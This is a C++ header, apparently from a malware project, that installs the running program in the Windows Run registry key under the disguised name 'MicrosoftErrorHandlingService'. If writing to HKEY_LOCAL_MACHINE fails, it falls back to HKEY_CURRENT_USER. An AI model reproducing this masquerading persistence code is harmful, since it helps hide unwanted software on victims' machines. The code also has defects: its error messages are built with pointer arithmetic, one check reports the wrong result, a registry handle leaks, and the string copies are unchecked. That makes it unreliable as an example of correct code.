#ifndef REGEDIT_H
#define REGEDIT_H

#include <windows.h>
#include <string.h>
#include <string>
#include "Helper.h"

namespace Registry
{

    std::string CheckErrorCode(LONG result)
    {
        std::string errormsg = "ERROR CODE : ";
        if (result == ERROR_INVALID_FUNCTION)
        {
            errormsg += result + " ERROR_INVALID_FUNCTION";
        }
        else if (result == ERROR_FILE_NOT_FOUND)
        {
            errormsg += result + " ERROR_FILE_NOT_FOUND";
        }
        else if (result == ERROR_PATH_NOT_FOUND)
        {
            errormsg += result + " ERROR_PATH_NOT_FOUND";
        }
        else if (result == ERROR_ACCESS_DENIED)
        {
            errormsg += result + " ERROR_ACCESS_DENIED";
        }
        else
        {
            errormsg += result;
        }
        return errormsg;
    }

    BOOL IsRegistered(HKEY key, PCWSTR AppName)
    {
        HKEY hKey = NULL;
        LONG result = -1;
        std::string strhkey;
        if (key == HKEY_LOCAL_MACHINE)
            strhkey = "HKEY_LOCAL_MACHINE";
        else if (key == HKEY_CURRENT_USER)
            strhkey = "HKEY_CURRENT_USER";

        result = RegOpenKeyExW(key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);
        if (result != ERROR_SUCCESS)
        {
            std::string errormsg = "[ERROR]RegOpenKeyExW - " + strhkey + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n" + CheckErrorCode(result);
            Helper::WriteAppLog(errormsg);
            return FALSE;
        }
        else
        {
            DWORD type;
            DWORD cbData;
            LONG qResult = -1;
            qResult = RegQueryValueExW(hKey, AppName, NULL, &type, NULL, &cbData);
            if (qResult != ERROR_SUCCESS)
            {
                std::string errormsg = "[ERROR]RegQueryValueExW - " + strhkey + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n" + CheckErrorCode(result);
                Helper::WriteAppLog(errormsg);
                return FALSE;
            }
            else
                return TRUE;
        }
    }

    BOOL Register(HKEY key,PCWSTR AppName, PCWSTR PathToExe, PCWSTR args)
    {
        HKEY hKey = NULL;
        LONG result = -1;
        BOOL success = TRUE;
        DWORD dwSize;
        const size_t count = MAX_PATH*2;
        wchar_t szValue[count] = {};
        std::string strhkey;
        if (key == HKEY_LOCAL_MACHINE)
            strhkey = "HKEY_LOCAL_MACHINE";
        else if (key == HKEY_CURRENT_USER)
            strhkey = "HKEY_CURRENT_USER";

        wcscpy(szValue, L"\"");
        wcscat(szValue, PathToExe);
        wcscat(szValue, L"\" ");

        if (args != NULL) //make sure all arguments ain't blank
        {
            wcscat(szValue, args);
        }

        result = RegCreateKeyExW(key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
        success = (result == 0);

        if (success)
        {
            dwSize = (wcslen(szValue)+1)*2;
            result = RegSetValueExW(hKey, AppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
            success = (result == 0);
        }
        else
        {
            std::string errormsg = "[ERROR]RegCreateKeyExW - " + strhkey + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n" + CheckErrorCode(result);
            Helper::WriteAppLog(errormsg);
            return FALSE;
        }

        if (!success)
        {
            std::string errormsg = "[ERROR]RegSetValueExW - " + strhkey + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n" + CheckErrorCode(result);
            Helper::WriteAppLog(errormsg);
            return FALSE;
        }

        if (hKey != NULL)
        {
            RegCloseKey(hKey);
            hKey = NULL;
        }

        return success;
    }

        void RegisterProgram()
        {
            PCWSTR AppName = L"MicrosoftErrorHandlingService";
            HKEY key = HKEY_LOCAL_MACHINE;
            wchar_t PathToExe[MAX_PATH];
            GetModuleFileNameW(NULL, PathToExe, MAX_PATH);

            if (IsRegistered(key,AppName))
            {
                Helper::WriteAppLog("[:D]This App is already installed");
                return;
            }
            else
            {
                std::wstring ws(PathToExe);
                std::string str(ws.begin(),ws.end());
                if (Register(key,AppName, PathToExe, L""))
                {
                    Helper::WriteAppLog("[;)]Installation the registry was successful : HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str);
                }
                else
                {
                    Helper::WriteAppLog("[:(]INSTALLATION FAILED : HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str + "\nTrying to install at HKEY_CURRENT_USER...");
                    key = HKEY_CURRENT_USER;
                    if (Register(key,AppName, PathToExe, L""))
                    {
                        Helper::WriteAppLog("[;)]Installation the registry was successful : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str);
                    }
                    else
                    {
                        Helper::WriteAppLog("[:(]INSTALLATION FAILED : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue = " + str);
                    }
                }
            }
        }
}
#endif // REGEDIT_H
